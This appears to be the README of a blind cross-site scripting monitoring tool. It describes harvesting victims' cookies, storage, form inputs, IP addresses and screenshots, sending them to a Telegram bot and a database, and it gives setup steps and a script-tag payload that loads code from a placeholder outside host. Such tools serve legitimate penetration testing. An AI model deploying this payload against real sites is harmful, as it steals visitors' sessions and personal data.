# XSS Monitor tool for OOB Blind-XSS
 
The XSS-Monitor Tool is provided for educational purposes only.

**Created By** : ​🅰🆁🆂🅷🅸🆈🅰
 
This tool is designed for testing XSS vulnerabilities and helping make the Internet and Web applications more secure. By using this tool, you get this item from user load xss : 

Cookies ,
Location,
UserAgent,
User ip,
Local Data,
Session Data,
Inputs item,
Page HTML source code,
Page Title,
ScreenShot of page

send notification to Telegram with BOT and save to database when trigger fire.

## How to install :

  1.Upload alert.php , eksss.js on your host
  
  2.change "https://YourSiteName.com/alert.php" in eksss.js to your host and path of PHP file and save it.
  
  3.open alert.php and set your information of Database config 

  ```php
      $servername = "localhost";
      $username = "UserDB_xss";
      $password = "PAS-DB";
      $dbname = "DB-name_monitor"
  ```

  4.set Telegram Bot information and ChatID Acount which you want to be notified :

  ```php
      $token = "**********Bot_Token***************";
      $chat_id = "****YourTelegramChatID";
  ```
      
  5.save alert.php 

## How to Use:

  use this payload for test :

```js
   <script src=https://YourSiteName.com/eksss.js></script>
```  
